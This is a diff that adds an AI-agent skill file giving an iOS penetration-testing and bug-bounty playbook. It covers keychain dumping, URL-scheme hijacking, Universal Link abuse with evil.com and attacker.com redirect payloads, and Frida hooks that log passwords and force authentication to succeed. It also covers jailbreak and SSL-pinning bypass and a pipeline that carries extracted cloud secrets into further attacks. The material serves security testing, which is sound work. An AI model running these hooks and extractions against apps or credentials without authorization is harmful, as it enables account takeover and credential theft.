@@ -1,0 +1,631 @@
+﻿---
+name: mobile-ios
+description: iOS app security testing — keychain extraction (dumper/Frida/Objection), URL scheme hijacking, Universal Links (AASA misconfiguration), Frida/Objection runtime manipulation, binary protection analysis (class-dump, otool), data storage analysis, and jailbreak detection bypass.
+sources: hack_skills, bug_bounty_reports
+allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
+---
+
+# SKILL: iOS Pentesting Tricks — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert iOS application security testing techniques. Covers jailbreak vs non-jailbreak methodology, keychain extraction, URL scheme/Universal Links abuse, Frida/Objection runtime hooks, binary protection checks, and data storage analysis. Base models miss protection class nuances (kSecAttrAccessibleAfterFirstUnlock risk), AASA misconfiguration patterns, and Frida gadget embedding for non-jailbreak testing.
+
+## 0. RELATED ROUTING
+
+- mobile-ssl-pinning-bypass — SSL pinning bypass for iOS (SecTrust hooks, SSL Kill Switch 2)
+- android-pentesting — when also testing Android version
+- auth — backend API security after traffic is intercepted
+
+---
+
+## 1. JAILBREAK VS NON-JAILBREAK TESTING
+
+| Capability | Jailbroken | Non-Jailbroken |
+|---|---|---|
+| SSL pinning bypass | Frida, SSL Kill Switch 2, Objection | Network proxy + mitmproxy profile (limited) |
+| Keychain access | keychain-dumper, Frida dump | Via backup extraction (limited) |
+| Filesystem inspection | Full sandbox access | Only via backup (ideviceinstaller) |
+| Runtime manipulation | Full Frida/Cycript/LLDB | Frida gadget in re-signed IPA only |
+| Binary analysis | class-dump, Hopper on-device | Decrypt IPA, analyze offline |
+| Method hooking | Full Frida capability | Re-signed app with Frida gadget |
+
+### Non-Jailbreak Setup
+
+```bash
+# Extract IPA from device
+ideviceinstaller -l                    # List installed apps
+
+# Sideload with Frida gadget (non-jailbreak):
+# 1. Extract IPA (unzip target.ipa)
+# 2. Insert FridaGadget.dylib into Frameworks/
+# 3. Add load command to binary with insert_dylib
+# 4. Re-sign with valid provisioning profile
+# 5. Install via ios-deploy
+```
+
+---
+
+## 2. KEYCHAIN EXTRACTION
+
+### Protection Classes
+
+| Class | Availability | Risk |
+|---|---|---|
+| `kSecAttrAccessibleWhenUnlocked` | Only unlocked | Medium |
+| `kSecAttrAccessibleAfterFirstUnlock` | After first unlock (survives lock) | High — tokens persist across locks |
+| `kSecAttrAccessibleAlways` | Always (deprecated iOS 12+) | Critical |
+| `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` | Passcode + unlocked | Low |
+| `ThisDeviceOnly` variants | Same device only | Cannot be backed up |
+
+### Extraction Methods
+
+```bash
+# keychain-dumper (jailbroken):
+/path/to/keychain-dumper -a              # All accessible items
+/path/to/keychain-dumper -g password     # Generic passwords
+
+# Objection:
+objection -g com.target.app explore
+> ios keychain dump
+> ios keychain dump --json
+
+# Frida:
+frida -U -f com.target.app -l keychain_dump.js
+
+# Check for insecure storage class:
+# kSecAttrAccessibleAfterFirstUnlock = high value target
+```
+
+### Keychain Item Types
+
+| Item Type | Typical Content |
+|---|---|
+| `kSecClassGenericPassword` | App tokens, API keys, credentials |
+| `kSecClassInternetPassword` | HTTP auth, OAuth tokens |
+| `kSecClassCertificate` | Client certificates |
+| `kSecClassIdentity` | Cert + private key |
+| `kSecClassKey` | Encryption keys |
+
+---
+
+## 3. URL SCHEME HIJACKING
+
+### Discovery
+
+```bash
+# Extract URL schemes from Info.plist:
+unzip -p target.ipa Payload/*.app/Info.plist | plutil -convert xml1 - -o -
+grep -A5 CFBundleURLSchemes extracted/Info.plist
+
+# Or with plistutil:
+plistutil -i Info.plist -o Info.xml
+grep -i "URL" Info.xml
+```
+
+### Hijacking via Malicious App
+
+```swift
+// Register same custom URL scheme in malicious app
+// CFBundleURLSchemes: ["targetapp"]
+// If victim opens URL scheme link → OS may open malicious app instead
+// Capture sensitive data passed via URL scheme (tokens, auth codes)
+```
+
+### Exploitation Vectors
+
+```
+1. OAuth callback via URL scheme:
+   targetapp://oauth/callback?code=AUTH_CODE
+   → If multiple apps register same scheme, malicious app captures auth code
+
+2. Deep link manipulation:
+   targetapp://payment?amount=100&to=attacker
+   → If app trusts URL scheme data without validation
+
+3. Universal Links fallback:
+   If aasa.json is misconfigured → browser opens URL scheme instead
+   → URL scheme is less secure than Universal Links
+```
+
+---
+
+## 4. UNIVERSAL LINKS (APPLE APP SITE ASSOCIATION)
+
+### AASA File Analysis
+
+```bash
+# AASA file location:
+# https://TARGET.COM/.well-known/apple-app-site-association
+# OR https://TARGET.COM/apple-app-site-association
+
+curl https://target.com/.well-known/apple-app-site-association | python3 -m json.tool
+```
+
+### Misconfiguration Patterns
+
+```json
+// OVERLY PERMISSIVE — matches all paths:
+{
+  "applinks": {
+    "apps": [],
+    "details": [{
+      "appID": "TEAMID.com.target.app",
+      "paths": ["*"]
+    }]
+  }
+}
+
+// Better but still risky:
+{
+  "paths": ["/account/*", "/settings/*"]
+}
+// If paths like /settings/ pass untrusted data via URL → open redirect in app
+```
+
+### AASA Testing
+
+```
+1. Download AASA file
+2. Check if paths are overly permissive ("*")
+3. Test deep links: open universal link with attacker-controlled query params
+4. Check if app handles HTTPS → app redirect without validation
+5. Test path: https://target.com/settings/?redirect=https://attacker.com
+   → If app opens this URL scheme → XSS or phishing within app WebView
+```
+
+---
+
+## 5. FRIDA / OBJECTION RUNTIME MANIPULATION
+
+### Common Objection Commands
+
+```bash
+# Start session:
+objection -g com.target.app explore
+# Or by PID:
+objection -g PID explore
+
+# Enumerate classes:
+> ios hooking list classes
+> ios hooking list classes --include-parent | grep -i auth
+
+# Hook methods:
+> ios hooking watch class ClassName
+> ios hooking watch method "-[ClassName methodName:]"
+
+# SSL pinning bypass:
+> ios sslpinning disable
+
+# Jailbreak detection bypass:
+> ios jailbreak simulate  # Simulate jailbroken environment
+# objection --gadget com.target.app explore  # For re-signed apps
+
+# Keychain:
+> ios keychain dump
+> ios keychain add --key MyKey --value MyValue
+
+# File system:
+> ios bundles list_frameworks
+> env  # List app directories (Documents, Library, etc.)
+```
+
+### Frida Scripts for iOS
+
+```javascript
+// Method tracing:
+var className = "LoginViewController";
+var methods = ObjC.classes[className].$ownMethods;
+methods.forEach(function(m) {
+    console.log("Method: " + m);
+    Interceptor.attach(ObjC.classes[className][m].implementation, {
+        onEnter: function(args) {
+            console.log("[+] " + m + " called");
+        }
+    });
+});
+
+// Hook specific method:
+var hook = ObjC.classes["AuthManager"]["- validatePassword:"].implementation;
+Interceptor.attach(hook, {
+    onEnter: function(args) {
+        var password = ObjC.Object(args[2]).toString();
+        console.log("Password: " + password);
+    },
+    onLeave: function(retval) {
+        retval.replace(1);  // Always return true
+    }
+});
+```
+
+---
+
+## 6. BINARY ANALYSIS
+
+### class-dump / class-dump-z
+
+```bash
+# Extract Objective-C class headers from binary:
+class-dump -H target.app/Binary -o headers/
+# Or with class-dump-z for Swift:
+class-dump-z target.app/Binary
+
+# Look for interesting classes:
+grep -r "password\|token\|auth\|secret\|key" headers/
+grep -r "pinning\|certificate\|trust" headers/
+```
+
+### Checking Binary Protections
+
+```bash
+# PIE (Position Independent Executable):
+otool -hv target.app/Binary | grep PIE
+# ASLR (Address Space Layout Randomization):
+otool -hv target.app/Binary | grep -i mh_execute
+
+# Stack canaries:
+otool -I -v target.app/Binary | grep stack_chk
+
+# ARC (Automatic Reference Counting):
+otool -I -v target.app/Binary | grep objc_release
+
+# Encryption:
+otool -l target.app/Binary | grep -A5 LC_ENCRYPTION_INFO
+# cryptid=1 → encrypted (needs decryption before analysis)
+```
+
+---
+
+## 7. DATA STORAGE ANALYSIS
+
+```bash
+# App sandbox directories (jailbroken):
+ls /var/mobile/Containers/Data/Application/<UUID>/
+# Key directories:
+# Documents/     → user data
+# Library/       → preferences, caches, cookies
+# Library/Caches/ → cached data (may contain tokens)
+# tmp/           → temporary files
+
+# Check for sensitive data in plist files:
+find /var/mobile/Containers/Data -name "*.plist" -exec plutil -convert xml1 {} \; -print
+
+# SQLite databases:
+find /var/mobile/Containers/Data -name "*.db" -exec sqlite3 {} .tables \;
+
+# NSUserDefaults (plist):
+# Location: Library/Preferences/com.target.app.plist
+cat "Library/Preferences/com.target.app.plist" | plutil -convert xml1 -
+
+# Core Data:
+find . -name "*.sqlite" | xargs strings | grep -i "password\|token\|secret"
+```
+
+---
+
+## 8. JAILBREAK DETECTION BYPASS
+
+```javascript
+// Frida: bypass common jailbreak checks
+Java.perform(function() {});  // Not needed for ObjC
+
+// Hook file existence checks:
+Interceptor.attach(Module.findExportByName("libSystem.B.dylib", "access"), {
+    onEnter: function(args) {
+        var path = Memory.readUtf8String(args[0]);
+        // Common jailbreak paths: /Applications/Cydia.app, /bin/bash, /etc/apt
+        if (path.indexOf("Cydia") !== -1 || path.indexOf("/bin/bash") !== -1) {
+            Memory.writeUtf8String(args[0], "/etc/this_path_does_not_exist");
+        }
+    }
+});
+
+// Objection:
+> ios jailbreak disable   // Disable jailbreak detection
+```
+
+---
+
+## 9. TESTING CHECKLIST
+
+```
+□ Check AASA file for overly permissive paths
+□ Enumerate URL schemes → test for hijacking with duplicate scheme
+□ Dump keychain → check for high-value items with AfterFirstUnlock class
+□ Run class-dump → identify auth/token/security-related classes
+□ Check binary protections: PIE, stack canaries, encryption
+□ Inspect app sandbox: Documents/, Library/, Preferences/
+□ Test SSL pinning bypass with Objection or SSL Kill Switch
+□ Hook authentication methods with Frida to intercept credentials
+□ Check NSUserDefaults for sensitive data storage
+□ Test deep link handlers for path traversal or injection
+□ Verify HTTPS enforcement (ATS) in Info.plist
+□ Check for hardcoded secrets: strings target.bin | grep -i "key\|token\|secret"
+```
+
+
+---
+
+## ios-redteam-pipeline — Hunting Methodology (real BB reports)
+
+## When to use this skill
+
+Trigger when:
+- Recon surfaces 1+ apps under the target's Apple Developer / App Store publisher page
+- A TestFlight public link or enterprise/ad-hoc `.ipa`/`manifest.plist` (OTA install) is found
+- Customer-facing app, dealer/partner portal, or employee mobile companion app ships on iOS
+- Bug bounty program lists iOS in scope
+- `apk-redteam-pipeline` already found Android endpoints/secrets — the iOS build often ships a *different* backend version worth diffing (see `hunt-shadow-api`)
+
+DO NOT use for:
+- Android-only targets — that's `apk-redteam-pipeline`
+- React Native / Flutter apps already fully covered by JS-bundle analysis on the web side
+- Server-side only assessments with no mobile client in scope
+
+---
+
+## Stage 0 — Inventory all org-owned iOS apps
+
+```bash
+# App Store search API (no auth, no scraping needed)
+curl -s "https://itunes.apple.com/search?term=<brand>&country=us&entity=software&limit=50" | python3 -m json.tool
+
+# Pull the full metadata for a known bundle ID (once you have one)
+curl -s "https://itunes.apple.com/lookup?bundleId=com.<brand>.app&country=us"
+```
+
+Extract: `trackId`, `bundleId`, `sellerName` (developer account — pivot to find sibling apps), `version`,
+`releaseNotes` (changelogs often reference deprecated/removed API behavior — feeds `hunt-shadow-api`).
+
+Cross-reference sibling-app bundle IDs surfaced from Android APK inventories (same
+multi-brand conglomerate usually reuses `com.<corp>.<sub-brand>` naming on both platforms).
+
+---
+
+## Stage 1 — IPA acquisition
+
+### Primary: from a real device you control (no jailbreak needed for a purchased/free app)
+```bash
+# Install the app on a real device via Apple Configurator 2 or Xcode, then pull the .ipa
+# Apple Configurator 2 (macOS): Devices > select device > right-click installed app > "Save to..."
+# Or via libimobiledevice:
+brew install libimobiledevice ideviceinstaller
+ideviceinstaller -l              # list installed apps + bundle IDs
+```
+
+### Secondary: TestFlight (if the program distributes betas publicly)
+Open the public TestFlight link, install via the TestFlight app, then extract as above.
+TestFlight builds are frequently LESS hardened than App Store releases (debug logging left on,
+staging API hosts hardcoded) — always prefer a TestFlight build over the Store build if both exist.
+
+### Tertiary: enterprise / ad-hoc distribution (OTA install)
+```bash
+# itms-services:// links embed a manifest.plist with a direct .ipa URL
+curl -s "https://<target>/manifest.plist" | plutil -convert xml1 -o - -
+# Look for <key>software-package</key> — that URL is a directly downloadable, unencrypted IPA
+curl -sk -L "<software-package-url>" -o target.ipa
+```
+Enterprise/ad-hoc IPAs are **not FairPlay-encrypted** — no jailbreak or decryption tooling needed,
+unlike an App Store binary pulled from a device.
+
+### Decrypting an App-Store-sourced binary (only if extracted from a jailbroken device)
+App Store binaries are FairPlay-encrypted at rest; a binary copied off a jailbroken device
+needs runtime decryption (`frida-ios-dump`, `bagbak`, or `flexdecrypt`) before static tools can
+read it meaningfully:
+```bash
+pip install --break-system-packages frida-tools
+# with frida-server running on the jailbroken device and the app in foreground:
+python3 dump.py <bundle_id>          # frida-ios-dump — outputs a decrypted .ipa
+```
+
+---
+
+## Stage 2 — Unpack and static analysis
+
+```bash
+# An IPA is just a zip
+unzip -o target.ipa -d extracted_target/
+cd extracted_target/Payload/*.app
+
+# Info.plist — bundle ID, URL schemes, ATS config, entitlements hint
+plutil -convert xml1 -o - Info.plist
+
+# Entitlements — codesign reads the .app bundle (or the Mach-O binary), NOT Info.plist
+codesign -d --entitlements :- Payload/<AppName>.app 2>/dev/null || \
+  security cms -D -i embedded.mobileprovision | plutil -convert xml1 -o - -
+
+# class-dump for Objective-C symbol/class recovery (compiled binary, not the .app bundle)
+brew install class-dump
+class-dump -H <AppBinaryName> -o headers/
+
+# Swift binaries: class-dump won't show much — use Hopper, Ghidra, or `nm`/`strings` instead
+nm -a <AppBinaryName> | grep -i swift | head -50
+strings -a <AppBinaryName> > strings_target.txt
+```
+
+For a fast triage pass without a disassembler, the strings dump alone usually surfaces most of
+what Stage 3 is looking for.
+
+---
+
+## Stage 3 — Secret grep (same catalog as apk-redteam-pipeline, iOS-specific sources added)
+
+```bash
+# URL grep — owned-domain references
+grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net)[a-zA-Z0-9./_?=&%-]*' strings_target.txt | sort -u
+
+# Cloud credentials (same 60-pattern catalog as Android — reuse verbatim)
+grep -oE 'AKIA[A-Z0-9]{16}'                             # AWS Access Key
+grep -oE 'AIza[A-Za-z0-9_-]{35}'                        # Google API key
+grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_target.txt   # JWT
+
+# iOS-specific: GoogleService-Info.plist (Firebase config bundled per-platform)
+find extracted_target -iname "GoogleService-Info.plist" -exec plutil -convert xml1 -o - {} \;
+# Look for API_KEY, PROJECT_ID, STORAGE_BUCKET, GCM_SENDER_ID, GOOGLE_APP_ID — same Firebase
+# public-read tests as apk-redteam-pipeline Stage 6.
+
+# iOS-specific: hardcoded config plists shipped in the bundle
+find extracted_target -iname "*.plist" ! -iname "Info.plist" -exec sh -c 'echo "=== {} ==="; plutil -convert xml1 -o - "{}"' \;
+
+# App Transport Security exceptions (Info.plist) — tells you if arbitrary/insecure loads are allowed
+plutil -extract NSAppTransportSecurity xml1 -o - Info.plist 2>/dev/null
+```
+
+### Keychain items left in a backup (if you have a device backup, encrypted or not)
+```bash
+pip install --break-system-packages iphone_backup_decrypt   # for encrypted local backups
+# keychain-dumper (run ON a jailbroken device) for live keychain contents:
+./keychain-dumper -e   # -e also decodes entitlements per item, showing which app owns which secret
+```
+
+---
+
+## Stage 4 — App Transport Security (ATS) misconfig + certificate-pinning bypass
+
+### Check for blanket ATS disablement (the single most common iOS network misconfig)
+```bash
+plutil -extract NSAppTransportSecurity xml1 -o - Info.plist
+```
+Red flags in the output:
+- `NSAllowsArbitraryLoads = true` at the top level — HTTP (cleartext) allowed anywhere, app-wide.
+- Per-domain `NSExceptionAllowsInsecureHTTPLoads = true` for a domain that carries auth tokens.
+- `NSAllowsArbitraryLoadsInWebContent = true` — WKWebView traffic exempted, common blind spot.
+
+A blanket ATS exception + a network position (rogue AP, ARP spoof, malicious VPN profile) =
+plaintext credential/token interception without touching pinning at all.
+
+### Certificate-pinning bypass (when pinning IS present and correctly configured)
+```bash
+pip install --break-system-packages frida-tools objection
+objection --gadget <bundle_id> explore
+# inside objection:
+ios sslpinning disable
+```
+If you want a Frida script instead, don't hand-roll one — use a maintained universal bypass
+(e.g. the widely-used `frida-ios-pinning`/`ios-ssl-bypass` community scripts). Modern iOS TLS goes
+through **BoringSSL**, so a reliable universal hook targets `SSL_CTX_set_custom_verify` /
+`SSL_get_psk_identity` at the native layer and forces the verify callback to return "OK" — this
+catches `URLSession`, `AFNetworking`, `Alamofire`, and `TrustKit` at once, which per-delegate
+Objective-C hooks (like the deprecated `NSURLConnection` delegate) miss:
+```bash
+# Pull a maintained universal BoringSSL-layer bypass and run it:
+frida -U -f <bundle_id> -l ios-ssl-bypass.js --no-pause
+```
+In practice, prefer **SSL Kill Switch 2** (jailbroken device, installs as a tweak) or
+**objection's `ios sslpinning disable`** over any hand-rolled script — both cover the common
+pinning implementations (`NSURLSession`, `AFNetworking`, `TrustKit`) without per-app tuning.
+
+---
+
+## Stage 5 — URL scheme / Universal Link enumeration
+
+```bash
+# Custom URL schemes (CFBundleURLTypes) — anything can invoke these via Safari/another app
+plutil -extract CFBundleURLTypes xml1 -o - Info.plist
+
+# Universal Links / Associated Domains (applinks:) — requires a matching apple-app-site-association
+plutil -extract com.apple.developer.associated-domains xml1 -o - Info.plist 2>/dev/null
+curl -s "https://<domain>/.well-known/apple-app-site-association" | python3 -m json.tool
+```
+
+For each custom scheme found (e.g. `myapp://`):
+- Trigger it from Safari/Notes and observe what the app does with parameters:
+  `myapp://reset-password?token=x&redirect=https://evil.com` — does the app trust an
+  attacker-supplied `redirect`/`url`/`callback` param and load it in a WebView (open-redirect →
+  WebView-XSS chain) or use it to bypass an auth screen?
+- If the scheme is also registered by another app on the device (scheme squatting), a malicious
+  app can intercept traffic intended for the legitimate app — check `CFBundleURLName` uniqueness.
+- Universal Links degrade to the custom scheme when the AASA validation fails or is absent —
+  test both paths for the same parameter-injection surface.
+
+---
+
+## Stage 6 — Runtime instrumentation (Frida / objection)
+
+Requires a jailbroken device (checkra1n/palera1n for older iOS, or a Corellium virtual device) —
+unlike Android, there is no practical rooted-emulator equivalent for iOS.
+
+```bash
+# Setup
+pip install --break-system-packages frida-tools objection
+# Install frida-server on the jailbroken device via Cydia/Sileo (frida repo), matching the
+# host frida-tools version exactly — version skew is the #1 cause of "failed to attach" errors.
+
+# Full interactive exploration
+objection --gadget <bundle_id> explore
+# Inside objection:
+ios hooking watch class <ClassName>
+ios hooking watch class_method <Class>.<method> --dump-args --dump-return
+ios keychain dump
+ios plist dump
+ios cookies get
+```
+
+### Network traffic capture (once pinning is bypassed)
+```bash
+mitmproxy --listen-port 8080
+# Set the device Wi-Fi proxy to host:8080, install the mitmproxy CA via http://mitm.it on-device
+# (Settings > General > VPN & Device Management > trust the cert, then enable full trust under
+# Certificate Trust Settings — iOS requires this second step, unlike Android)
+```
+
+---
+
+## Decision tree — what to do with what you find
+
+| Finding | Next move |
+|---|---|
+| `NSAllowsArbitraryLoads = true` | Confirm a token/credential actually transits HTTP — needs a network position to exploit, but is a real finding on its own (config-level, no MITM needed to report) |
+| Hardcoded JWT / API key in strings dump | Same as Android — test against the API host, chain into `hunt-api-misconfig` |
+| GoogleService-Info.plist present | Test public Firestore/RTDB/Storage read (identical to apk-redteam-pipeline Stage 6) |
+| Custom URL scheme accepts a `redirect`/`url` param | Test open-redirect → WebView-load chain; check for scheme squatting by other installed apps |
+| Universal Link AASA missing/misconfigured | Confirm scheme fallback still carries the same injectable params |
+| Entitlements show `keychain-access-groups` shared with other apps | Cross-app Keychain read — a compromised sibling app reads this app's secrets |
+| Older API version referenced vs. what the current web app calls | Hand off to `hunt-shadow-api` for version-diffing |
+
+---
+
+## Anti-patterns
+
+- **Don't assume App Store = FairPlay-encrypted requires jailbreak** — TestFlight and enterprise/ad-hoc
+  builds are frequently NOT encrypted and need no decryption step at all. Always check distribution
+  channel before reaching for `frida-ios-dump`.
+- **Don't skip Swift binaries because class-dump shows nothing** — `strings` and `nm` still work; a
+  proper Swift-aware disassembler (Hopper, Ghidra with Swift demangling) recovers the rest.
+- **Don't stop at "pinning is present" as a finding** — pinning is a mitigation, not a vulnerability;
+  the finding is what you can do once it's bypassed (or the ATS misconfig that makes it moot).
+- **Don't ignore WKWebView-loaded content** — `NSAllowsArbitraryLoadsInWebContent` is a distinct,
+  frequently-overlooked exception from the top-level ATS setting.
+- **Don't run Frida instrumentation against a personal/production Apple ID device** — use a
+  dedicated jailbroken test device or Corellium instance.
+
+---
+
+## Tooling install (one-time)
+
+```bash
+brew install libimobiledevice ideviceinstaller class-dump
+pip install --break-system-packages frida-tools objection iphone_backup_decrypt
+# Jailbroken test device (checkra1n/palera1n) or a Corellium virtual iOS device for runtime work
+# frida-server installed on-device via the Frida Cydia/Sileo repo
+```
+
+---
+
+## Related Skills & Chains
+
+- **`apk-redteam-pipeline`** — the Android counterpart; run both when a target ships on both
+  platforms. Sibling bundle IDs and shared backend endpoints frequently surface cross-platform.
+- **`hunt-shadow-api`** — mobile builds (iOS and Android alike) often hardcode an older API
+  version than the current web app. Chain: IPA reveals `/v1/*` endpoints → `hunt-shadow-api`
+  diffs `/v1/` against the current `/v3/` for auth/validation regressions.
+- **`cloud-iam-deep`** — IPA secret extraction frequently yields live AWS/GCP/Azure credentials
+  or Firebase configs. Chain: strings-grep produces an AWS key → `cloud-iam-deep` privilege
+  analysis.
+- **`hunt-api-misconfig`** — hardcoded JWTs/API keys extracted here feed directly into JWT
+  algorithm-confusion and mass-assignment testing there.
+- **`evidence-hygiene`** — extracted Keychain items and secrets need redaction before report
+  inclusion.
+- **`offensive-osint`** — App Store developer-page enumeration is part of the broader org recon
+  graph; pair with certificate-transparency lookups for the same brand.
+
+
+
